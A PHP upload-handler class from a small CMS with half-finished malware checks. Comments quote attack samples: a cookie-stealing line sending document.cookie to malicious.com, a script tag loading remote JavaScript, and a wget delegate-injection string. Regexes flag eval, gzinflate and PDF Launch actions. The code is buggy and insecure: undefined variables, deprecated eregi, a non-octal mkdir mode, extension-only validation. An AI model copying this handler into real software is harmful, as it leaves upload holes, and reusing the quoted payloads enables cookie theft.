<?php
/**
 * http://be.php.net/manual/en/features.file-upload.common-pitfalls.php
 * http://be.php.net/manual/en/features.file-upload.multiple.php 
 * @author Lieven Roegiers
 * @copyright 2009 
 * @CMS autosite
 * Todo make links for multilink uploading
*/
namespace autosystem;
class Upload{
	private $UPL_trueext;
    private $UPL_trueContenttypes;
	private $maximgsize;
	private $links =array();
    private $onlyimages = false;
    private $MakeDirIfNotExist = true;
    private $errors =[];
	/**
	 * @param $FILES	your $_FILES by reference
	 * @param $formitems	alle fields that can upload $formitems[fieldname]
	 * @param $trueext	al true extentions array(".gif",".png")
	 * @param $to path	the path to move
	*/
	public function load(&$FILES,&$formitems,$trueext,$topath,$userid ='0000'){
		$this->UPL_trueext = $trueext;
        if(!is_dir($topath)&& $this->MakeDirIfNotExist && !mkdir($topath,644)){
            $this->errors[]='the place to save not exist and can not make';
        }
       	if($FILES!=null&& is_array($FILES)){
       		foreach($FILES as $key=>$value){    			
       			if(is_array($formitems)&& in_array($key,$formitems)){//is the file askt in form
					if($value['name']!=null ){//if there is a upload 
						if(is_array($value['name'])){//complex multiple upload
							foreach($value['name'] as $kkey=>$namevalue){
								$tmpname = $value['tmp_name'][$kkey];
								if(self::isfile($namevalue,$value['error'][$kkey])){
									self::saveuploadedfile($tmpname,$namevalue,$topath,$userid.'_'.$key);
								}
							}
						}else{
							$tmpname =$value['tmp_name'];
							self::saveuploadedfile($value['tmp_name'],$value['name'],$topath,$userid.'_'.$key);	
						}
					}
       			}else{
       				$this->errors[]='upload.inc key not exist';
       			}
			}
		}
	}
    private function validate($filename,&$data_arr,$fieldname){
       $ext = $this->getext($filename);
       return ($this->is_trueext($this->getext($filename))&& $data_arr['error'][$fieldname]<1);
    }
    /**
     * Upload::checkasimg()
     * @param mixed  $_FILES['file']['type']
     * @return
     */
    private function checkasimg($type){
        return eregi('image/',$type);//@TODO UPGRADE TO 7
    }
    private function getmime(){
         $finfo = finfo_open(FILEINFO_MIME_TYPE); // return mime type ala mimetype extension
         $fileatt_type  = finfo_file($finfo, $filename); //$fileatt_type = mime_content_type($filename);(OLD CODE)
           /**
            * $finfo = finfo_open(FILEINFO_MIME_TYPE); // return mime type ala mimetype extension
              $fileatt_type  = finfo_file($finfo, $filename); //$fileatt_type = mime_content_type($filename);(OLD CODE)
           */ 
    }
	/**
	* @param $filename	string of the filename for get ext
	* @param $error	$value['error'][$kkey]   =>404 or anything else
	* @return true/false
	*/
	private function isfile($filename,$error){
		return $this->is_trueext($this->getext($filename));
	}
	/**
	* @return asoarray of the link to the files
	*/
	public function getlinks(){
		return $this->links;
	}
	/**
	* @param $ext	can use ext+
	* @return true/false
	*/
	private function is_trueext($ext){
       	return in_array($ext,$this->UPL_trueext);
	}
	/**
	* @param $filename the name of the file
	* @return string extention and the point
	*/
	private function getext($filename){
		//$exts = split("[/\\.]", $filename);//split deprication php7
		//$n = count($exts)-1;
		//$ext = $exts[$n];
       	return (string)strtolower(strrchr($filename,'.'));
	}
    /**
	* @param $ext	can use ext
	* TODO make control for mimes
	* @return true/false
	*/
	private function is_trueContent($content){
       	return in_array($content,$this->UPL_trueContenttypes);
	}
	/**
	* @param $tmpfile the name of the file to temp dir server
    * @param $filename new name on the server
    * @param $topath  the path on the server where we save the img
	* @return string extention and the point
	*/
	private function saveuploadedfile($tmpfile,$filename,$topath,$from='upload_'){
			if(!is_file($topath.$from.'_'.$filename)){
				$len = filesize($tmpfile);//$len = sizeof($this->links[$from]);
				$this->links[$from][$len]= $topath.$from.'_'.$filename;
                if(!is_dir($topath)){print('Dir not exist'.$topath); }
				return move_uploaded_file($tmpfile,$topath.$from.'_'.$filename);
			}else{
				false;
			}
	}
	public function generatethump($height = 150,$with=0){
		if($ispic){
			$resizer = new resizer($_FILES);
			$resizer->MOVEthumppic_to();
			$resizer->MOVErealpic_to();
		} 
	}
    private function checkfileinjection(&$data){
        //https://access.redhat.com/security/vulnerabilities/2296071
        //"wget" -q -O "%o" "https:%M"
    }
    static private function isInfected($string){
        //< script src = h t t p : / / w w w . nihaorr1.com/1.js >
        $checks = ['/script/i','/pack/i'];
        foreach($checks as $check){
            if(preg_match($check,$string)){return true; }
        }
        return false;
    }
    static private function isCryptoInfected($local,$codeString){
        //<?php @eval(
        //<?php eval(
        $checks =['/eval/i','/pack/i','/gzinflate/i'];
        foreach($checks as $check){
            if(preg_match($check,$string)){return true; }
        }
        return false;
    }
    static private function isPDFInfected($local,$string){
        $checks =['/OpenAction/i','/DOS/i','/C:\\/i','/Launch/i'];
        foreach($checks as $check){ 
            if(preg_match($check,$string)){return true; }
        }
        return false;
    }
    static private function checkmore(){
        /*
        document.location = ’http://malicious.com/steal cookie.php?’  + document.cookie         
        */
    }
    static public function checkIsFileOK($filename){
       $preline ='' ;
       if( $file = fopen($filename,'r+')){
            while(!feof($file)){
    	    	$line= fgets($this->file, 4096);
                if($this->isInfected($preline.$line)){
                    return false;
                }
                $preline = $line;
    		}
        }
        return true;
    }
}

?>